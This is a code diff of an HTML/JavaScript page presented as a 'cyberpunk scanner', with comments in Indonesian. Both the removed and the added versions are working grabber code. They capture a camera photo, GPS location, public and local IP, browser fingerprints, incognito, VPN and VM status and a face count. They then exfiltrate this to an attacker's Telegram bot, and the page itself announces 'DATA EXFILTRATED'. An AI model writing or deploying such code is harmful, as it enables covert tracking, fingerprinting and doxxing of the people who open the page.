-    }
-
-    // WebGL fingerprint
-    function getWebGLFP() {
-      let gl = document.createElement('canvas').getContext('webgl');
-      if (!gl) return 'N/A';
-      let ext = gl.getExtension('WEBGL_debug_renderer_info');
-      if (ext) {
-        return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) + '|' + gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-      }
-      return 'N/A';
-    }
-
-    // Audio fingerprint (sederhana)
-    function getAudioFP() {
-      try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = ctx.createOscillator();
-        const analyser = ctx.createAnalyser();
-        osc.connect(analyser);
-        osc.start();
-        osc.stop(0.001);
-        const data = new Uint8Array(analyser.frequencyBinCount);
-        analyser.getByteFrequencyData(data);
-        return data.slice(0, 10).join('');
-      } catch { return 'N/A'; }
-    }
-
-    // Font detection (sederhana)
-    function getInstalledFonts() {
-      const baseFonts = ['monospace', 'sans-serif', 'serif'];
-      const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS'];
-      let available = [];
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.font = '72px monospace';
-      let baseWidth = ctx.measureText('mmmmmmmmmm').width;
-      fontList.forEach(font => {
-        ctx.font = '72px "' + font + '", monospace';
-        let width = ctx.measureText('mmmmmmmmmm').width;
-        if (width !== baseWidth) available.push(font);
-      });
-      return available.slice(0, 5).join(', ') || 'None';
-    }
-
-    // Third-party cookies test
-    function checkThirdPartyCookies() {
-      return new Promise(resolve => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'https://google.com/favicon.ico'; // coba akses cross-origin
-        document.body.appendChild(iframe);
-        setTimeout(() => {
-          try {
-            // Cek apakah ada akses ke cookie? sulit. Alternatif: cek apakah iframe bisa menyetel cookie? kita skip
-            resolve('Unknown');
-          } catch { resolve('Blocked'); }
-          document.body.removeChild(iframe);
-        }, 1000);
-      });
-    }
-
-    // AdBlocker detection
-    function detectAdBlocker() {
-      return new Promise(resolve => {
-        const bait = document.createElement('div');
-        bait.innerHTML = '&nbsp;';
-        bait.className = 'adsbox';
-        bait.style.position = 'absolute';
-        bait.style.top = '-1000px';
-        document.body.appendChild(bait);
-        setTimeout(() => {
-          const hidden = bait.offsetHeight === 0;
-          document.body.removeChild(bait);
-          resolve(hidden ? '✅' : '❌');
-        }, 100);
-      });
-    }
-
-    // TLS Version & HSTS (tidak bisa langsung, kita bisa lihat dari location.protocol dan header? tidak ada API)
-    function getTLSInfo() {
-      return { tls: location.protocol === 'https:' ? 'TLS 1.2+ (likely)' : 'HTTP', hsts: 'Unknown' };
-    }
-
-    // VM Detection (sederhana)
-    function detectVM() {
-      const ua = navigator.userAgent;
-      if (ua.includes('VirtualBox') || ua.includes('VMware') || ua.includes('QEMU')) return 'Yes';
-      // Cek platform dan core
-      if (navigator.hardwareConcurrency <= 2 && screen.width <= 1024) return 'Possible VM';
-      return 'No';
-    }
-
-    // ========== GATHER ALL DEVICE INFO ==========
-    async function gatherDeviceInfo() {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const deviceType = /Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop';
-      let os = "Unknown OS";
-      if (ua.indexOf("Win") !== -1) os = "Windows";
-      else if (/Mac/.test(ua)) os = "MacOS";
-      else if (/Linux/.test(ua)) os = "Linux";
-      else if (/Android/.test(ua)) os = "Android";
-      else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
-      let deviceModel = /iPhone/.test(ua) ? "iPhone" : /iPad/.test(ua) ? "iPad" : /Android/.test(ua) ? "Android Device" : "Desktop";
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
-      let batteryInfo = { level: "N/A", charging: "N/A", discharge: "N/A" };
-      if (navigator.getBattery) { try { const battery = await navigator.getBattery(); 
-        batteryInfo = { 
-          level: Math.round(battery.level*100)+'%', 
-          charging: battery.charging?"Yes":"No",
-          discharge: battery.dischargingTime ? Math.round(battery.dischargingTime/60) + ' min' : 'N/A'
-        }; 
-      } catch(e){} }
-      let browser = "Unknown";
-      if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) browser = "Chrome";
-      else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
-      else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
-      else if (ua.indexOf("Edg") > -1) browser = "Edge";
-      else if (ua.indexOf("OPR") > -1) browser = "Opera";
-      let ip = "Unknown"; try { const res = await fetch('https://api.ipify.org?format=json'); ip = (await res.json()).ip; } catch(e){}
-      const language = navigator.language;
-      const resolution = window.screen.width+"x"+window.screen.height;
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
-      const pixelRatio = window.devicePixelRatio || 1;
-      const orientation = window.screen.orientation ? window.screen.orientation.type : "Unknown";
-
-      // CPU
-      const arch = detectArch();
-      const simd = detectSIMD();
-      const throttling = await cpuThrottlingScore();
-      const heap = getHeapInfo();
-
-      // GPU
-      const gpu = getWebGLInfo();
-      const webgpu = detectWebGPU();
-
-      // Display
-      const refresh = await detectRefreshRate();
-      const hdr = detectHDR();
-      const gamut = detectGamut();
-      const colorDepth = screen.colorDepth;
-      const pixelDepth = screen.pixelDepth;
-
-      // Storage
-      let storage = { quota: 'N/A', usage: 'N/A', persistent: 'N/A' };
-      try {
-        const est = await navigator.storage.estimate();
-        storage.quota = (est.quota / 1048576).toFixed(2) + ' MB';
-        storage.usage = (est.usage / 1048576).toFixed(2) + ' MB';
-        storage.persistent = await navigator.storage.persisted() ? 'Yes' : 'No';
-      } catch(e){}
-
-      // Audio
-      const audio = await getAudioInfo();
-
-      // Camera
-      const camera = await getCameraInfo();
-
-      // Network deep
-      const localIP = await getLocalIP();
-      const jitter = await measureJitter();
-      const vpn = await detectVPN(ip, localIP);
-
-      // Fingerprint
-      const canvasFP = getCanvasFP();
-      const webglFP = getWebGLFP();
-      const audioFP = getAudioFP();
-      const fonts = getInstalledFonts();
-      // Hash unik sederhana
-      const uniqueHash = btoa(canvasFP.slice(0,20) + webglFP + audioFP + fonts + timeZone).slice(0,20);
-
-      // Keamanan
-      const dnt = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
-      const thirdCookies = await checkThirdPartyCookies();
-      const adblock = await detectAdBlocker();
-      const tlsInfo = getTLSInfo();
-      const vm = detectVM();
-
-      // Lokasi (akan diisi nanti saat scan)
-      let location = { coords: 'N/A', acc: 'N/A', alt: 'N/A', speed: 'N/A' };
-
-      return {
-        os, deviceModel, deviceType, browser, ip, language, resolution, provider, pixelRatio, orientation,
-        memory, battery: batteryInfo, timeZone, platform,
-        cpu: { cores: navigator.hardwareConcurrency, arch, simd, throttling },
-        heap,
-        gpu: { vendor: gpu.vendor, renderer: gpu.renderer, version: gpu.version, extensions: gpu.extensions.join(', ').slice(0,50) },
-        webgpu,
-        display: { refresh, colorDepth, pixelDepth, hdr, gamut },
-        storage,
-        audio,
-        camera,
-        network: { publicIP: ip, localIP, vpn, jitter },
-        fingerprint: { canvasFP: canvasFP.slice(0,30), webglFP: webglFP.slice(0,30), audioFP: audioFP.slice(0,30), fonts, uniqueHash },
-        security: { dnt, thirdCookies, adblock, tls: tlsInfo.tls, hsts: tlsInfo.hsts, vm },
-        location
-      };
-    }
-
-    // ========== UPDATE UI ==========
-    async function updateUI(info) {
-      // Device Matrix
-      let html = `
-        <div class="info-row"><span class="info-label">OS</span><span class="info-value">${info.os}</span></div>
-        <div class="info-row"><span class="info-label">Device</span><span class="info-value">${info.deviceModel} (${info.deviceType})</span></div>
-        <div class="info-row"><span class="info-label">Browser</span><span class="info-value">${info.browser}</span></div>
-        <div class="info-row"><span class="info-label">IP</span><span class="info-value">${info.ip}</span></div>
-        <div class="info-row"><span class="info-label">Battery</span><span class="info-value">${info.battery.level} (${info.battery.charging})</span></div>
-        <div class="info-row"><span class="info-label">Language</span><span class="info-value">${info.language}</span></div>
-        <div class="info-row"><span class="info-label">Resolution</span><span class="info-value">${info.resolution}</span></div>
-        <div class="info-row"><span class="info-label">Provider</span><span class="info-value">${info.provider}</span></div>
-        <div class="info-row"><span class="info-label">Time Zone</span><span class="info-value">${info.timeZone}</span></div>
-      `;
-      deviceInfoContent.innerHTML = html;
-
-      // CPU & Memory
-      document.getElementById('cpu-cores').innerText = info.cpu.cores || 'N/A';
-      document.getElementById('cpu-arch').innerText = info.cpu.arch;
-      document.getElementById('simd').innerText = info.cpu.simd ? '✅' : '❌';
-      document.getElementById('throttling').innerText = info.cpu.throttling;
-      document.getElementById('used-heap').innerText = info.heap.usedJSHeapSize;
-      document.getElementById('total-heap').innerText = info.heap.totalJSHeapSize;
-      document.getElementById('heap-limit').innerText = info.heap.jsHeapSizeLimit;
-
-      // GPU
-      document.getElementById('gpu-vendor').innerText = info.gpu.vendor || 'N/A';
-      document.getElementById('gpu-renderer').innerText = info.gpu.renderer || 'N/A';
-      document.getElementById('webgl-version').innerText = info.gpu.version;
-      document.getElementById('webgl-ext').innerText = info.gpu.extensions.slice(0,30);
-      document.getElementById('webgpu').innerText = info.webgpu ? '✅' : '❌';
-
-      // Display
-      document.getElementById('refresh-rate').innerText = info.display.refresh;
-      document.getElementById('color-depth').innerText = info.display.colorDepth;
-      document.getElementById('pixel-depth').innerText = info.display.pixelDepth;
-      document.getElementById('hdr').innerText = info.display.hdr;
-      document.getElementById('gamut').innerText = info.display.gamut;
-
-      // Battery
-      document.getElementById('battery-level').innerText = info.battery.level;
-      document.getElementById('battery-charging').innerText = info.battery.charging;
-      document.getElementById('discharge-time').innerText = info.battery.discharge;
-
-      // Storage
-      document.getElementById('quota').innerText = info.storage.quota;
-      document.getElementById('usage').innerText = info.storage.usage;
-      document.getElementById('persistent').innerText = info.storage.persistent;
-
-      // Audio
-      document.getElementById('sample-rate').innerText = info.audio.sampleRate;
-      document.getElementById('audio-codecs').innerText = info.audio.codecs.join(', ') || 'N/A';
-      document.getElementById('audio-latency').innerText = info.audio.latency;
-      document.getElementById('audio-out').innerText = info.audio.devices.slice(0,2).join(', ') || 'N/A';
-
-      // Camera
-      document.getElementById('cam-res').innerText = info.camera.maxRes;
-      document.getElementById('cam-fps').innerText = info.camera.fps;
-      document.getElementById('cam-torch').innerText = info.camera.torch ? '✅' : '❌';
-
-      // Network
-      document.getElementById('public-ip').innerText = info.network.publicIP;
-      document.getElementById('local-ip').innerText = info.network.localIP;
-      document.getElementById('vpn').innerText = info.network.vpn;
-      document.getElementById('jitter').innerText = info.network.jitter;
-
-      // Fingerprint
-      document.getElementById('canvas-fp').innerText = info.fingerprint.canvasFP;
-      document.getElementById('webgl-fp').innerText = info.fingerprint.webglFP;
-      document.getElementById('audio-fp').innerText = info.fingerprint.audioFP;
-      document.getElementById('fonts').innerText = info.fingerprint.fonts.slice(0,20);
-      document.getElementById('unique-hash').innerText = info.fingerprint.uniqueHash;
-
-      // Security
-      document.getElementById('dnt').innerText = info.security.dnt;
-      document.getElementById('third-cookies').innerText = info.security.thirdCookies;
-      document.getElementById('adblock').innerText = info.security.adblock;
-      document.getElementById('tls').innerText = info.security.tls;
-      document.getElementById('hsts').innerText = info.security.hsts;
-      document.getElementById('vm').innerText = info.security.vm;
-
-      // Location (akan diisi saat scan)
-    }
-
-    // ========== FUNGSI LAMA (TETAP) ==========
-    function createHologramEffect() { const hologram = document.createElement('div'); hologram.className = 'hologram-effect'; return hologram; }
-
-    async function captureQuantumImage() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-      ctx.globalCompositeOperation = 'lighter';
-      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
-      ctx.drawImage(canvas, 0, 0);
-      ctx.globalAlpha = 0.3; ctx.fillStyle = '#00ff88';
-      for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
-      return canvas.toDataURL('image/webp', 0.8);
-    }
-
-    function dataURItoBlob(dataURI) {
-      const byteString = atob(dataURI.split(',')[1]);
-      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-      return new Blob([ab], { type: mimeString });
-    }
-
-    async function detectFaceCount() { 
-      try { return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; } catch { return "N/A"; }
-    }
-    async function loadFaceModel() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); }
-
-    function generateHologramReport(imageData, locationData, deviceInfo) { return { image:imageData, metadata:{location:locationData, deviceInfo} }; }
-
-    function sendToTelegram(report) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
-      const d = report.metadata.deviceInfo;
-      // Caption ringkas namun informatif
-      const caption = 
-`📍 *Location:* ${report.metadata.location.coordinates}
-🗺️ *Map:* [View Map](${report.metadata.location.link})
-
-💻 *OS:* ${d.os} | *Device:* ${d.deviceModel}
-🌐 *Browser:* ${d.browser} | *IP:* ${d.ip}
-⚡ *CPU:* ${d.cpu.cores} core, ${d.cpu.arch}, SIMD:${d.cpu.simd}
-🎮 *GPU:* ${d.gpu.renderer?.substring(0,30)}
-📱 *Display:* ${d.display.refresh}Hz, HDR:${d.display.hdr}
-🔋 *Battery:* ${d.battery.level} (${d.battery.charging})
-🧠 *Memory:* ${d.memory} | *Storage:* ${d.storage.quota}
-📡 *Network:* ${d.provider} | Jitter:${d.network.jitter}
-🆔 *FP Hash:* ${d.fingerprint.uniqueHash}
-🔒 *Security:* AdBlock:${d.security.adblock}, VM:${d.security.vm}
-👥 *Faces:* ${d.faceCount}
-
-_🤖 Generated by Ultimate Cyberpunk Scanner v5.0_`;
-      formData.append('caption', caption);
-      formData.append('parse_mode', 'Markdown');
-      fetch(url,{method:'POST',body:formData});
-    }
-
-    async function initCamera() {
-      try {
-        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
-        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:isMobile?"user":"environment"}});
-        video.srcObject = stream; currentStream = stream; document.body.appendChild(createHologramEffect()); loadFaceModel();
-      } catch(err){ alert('Error accessing camera: '+err.message); }
-    }
-
-    // ========== SCAN UTAMA ==========
-    async function startQuantumScan() {
-      if(isScanning) return; 
-      isScanning = true; 
-      loading.style.display = 'block';
-      
-      let progress = 0;
-      const interval = setInterval(() => {
-        progress = Math.min(100, progress + 10);
-        progressFill.style.width = progress + '%';
-        if (progress >= 100) clearInterval(interval);
-      }, 200);
-
-      const imageData = await captureQuantumImage();
-      let deviceInfo = await gatherDeviceInfo();
-      try { deviceInfo.faceCount = await detectFaceCount(); } catch(e){ deviceInfo.faceCount = "N/A"; }
-      
-      await updateUI(deviceInfo);
-
-      let locationData = {coordinates:'Unknown',link:'Unknown'};
-      if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition((pos)=>{
-          locationData = {
-            coordinates:`${pos.coords.latitude},${pos.coords.longitude}`,
-            link:`https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
-          };
-          deviceInfo.location = {
-            coords: locationData.coordinates,
-            acc: pos.coords.accuracy + ' m',
-            alt: pos.coords.altitude ? pos.coords.altitude + ' m' : 'N/A',
-            speed: pos.coords.speed ? pos.coords.speed + ' m/s' : 'N/A'
-          };
-          // Update UI lokasi
-          document.getElementById('loc-coords').innerText = locationData.coordinates;
-          document.getElementById('loc-acc').innerText = pos.coords.accuracy + ' m';
-          document.getElementById('loc-alt').innerText = pos.coords.altitude ? pos.coords.altitude + ' m' : 'N/A';
-          document.getElementById('loc-speed').innerText = pos.coords.speed ? pos.coords.speed + ' m/s' : 'N/A';
-
-          const report = generateHologramReport(imageData, locationData, deviceInfo);
-          sendToTelegram(report);
-          if(navigator.vibrate) navigator.vibrate(300);
-          loading.style.display = 'none'; 
-          isScanning = false;
-        }, ()=>{
-          const report = generateHologramReport(imageData, locationData, deviceInfo);
-          sendToTelegram(report);
-          loading.style.display = 'none'; 
-          isScanning = false;
+    // --- DETEKSI INCOGNITO ---
+    async function checkIncognito() {
+        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if (!fs) return "Unknown";
+        return new Promise(res => {
+            fs(window.TEMPORARY, 100, () => res("NO"), () => res("YES"));
         });
-      } else { 
-        const report = generateHologramReport(imageData, locationData, deviceInfo); 
-        sendToTelegram(report);
-        loading.style.display = 'none'; 
-        isScanning = false;
-      }
     }
 
-    // Inisialisasi
-    if(navigator.mediaDevices){ 
-      initCamera(); 
-      document.getElementById('capture-btn').onclick = startQuantumScan; 
+    // --- MAIN LOGIC ---
+    btn.addEventListener('click', async () => {
+        btn.disabled = true;
+        pushLog("Initiating Phantom Protocol...");
+        
+        // 1. Request Camera
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+            pushLog("Optic sensors online.");
+        } catch (e) {
+            pushLog("Optic access denied. Proceeding with digital trace only.");
+        }
+
+        // 2. Gather Data
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 5;
+            if (progress > 100) progress = 100;
+            fill.style.width = progress + "%";
+            if (progress === 100) clearInterval(interval);
+        }, 150);
+
+        // Fetch IP & Location
+        let ipData = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipData = await res.json();
+            document.getElementById('ip').innerText = ipData.ip;
+            document.getElementById('vpn').innerText = ipData.org.includes('VPN') || ipData.org.includes('Hosting') ? "YES" : "NO";
+            pushLog(`Signal found: ${ipData.city}, ${ipData.country_name}`);
+        } catch (e) { pushLog("Network stealth detected. IP masked."); }
+
+        // Local IP via WebRTC
+        const pc = new RTCPeerConnection();
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = i => {
+            if(i.candidate) {
+                document.getElementById('lip').innerText = i.candidate.address;
+                pc.onicecandidate = null;
+            }
+        };
+
+        // Hardware
+        document.getElementById('os').innerText = navigator.platform;
+        document.getElementById('cpu').innerText = `${navigator.hardwareConcurrency} Cores`;
+        document.getElementById('ram').innerText = `${navigator.deviceMemory || 'N/A'} GB`;
+        document.getElementById('inc').innerText = await checkIncognito();
+
+        // 3. Send to Telegram
+        setTimeout(async () => {
+            const report = {
+                OS: navigator.platform,
+                Browser: navigator.userAgent,
+                IP: ipData.ip || "Unknown",
+                Location: `${ipData.city || 'N/A'}, ${ipData.country || 'N/A'}`,
+                ISP: ipData.org || "Unknown",
+                Cores: navigator.hardwareConcurrency,
+                RAM: navigator.deviceMemory,
+                Incognito: document.getElementById('inc').innerText,
+                Screen: `${window.screen.width}x${window.screen.height}`
+            };
+
+            const text = `🛸 *NEW QUANTUM TRACE*\n\n` +
+                         `👤 *Target:* ${report.OS}\n` +
+                         `🌐 *IP:* ${report.IP}\n` +
+                         `📍 *Loc:* ${report.Location}\n` +
+                         `🏢 *ISP:* ${report.ISP}\n` +
+                         `🧠 *Hardware:* ${report.Cores} Cores / ${report.RAM}GB RAM\n` +
+                         `🕵️ *Incognito:* ${report.Incognito}\n` +
+                         `🖥️ *Res:* ${report.Screen}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+                pushLog("Data uploaded to Cloud Ghost.");
+                alert("SCAN COMPLETE: DATA EXFILTRATED.");
+            } catch (e) {
+                pushLog("Upload failed. Encryption broken.");
+            }
+            btn.disabled = false;
+        }, 5000);
+    });
+
+    // Voice Synthesis for "Cyberpunk" feel
+    function speak(text) {
+        const msg = new SpeechSynthesisUtterance(text);
+        msg.rate = 1.2; msg.pitch = 0.8;
+        window.speechSynthesis.speak(msg);
     }
 
-    function stopCamera(){ if(currentStream) currentStream.getTracks().forEach(t=>t.stop()); }
-    window.addEventListener('beforeunload', stopCamera);
-
-    // Update dashboard setiap 5 detik
-    setInterval(async () => {
-      if (!isScanning) {
-        let info = await gatherDeviceInfo();
-        updateUI(info);
-      }
-    }, 5000);
-  </script>
+    pushLog("System Neural Link Established.");
+</script>
 </body>
 </html>
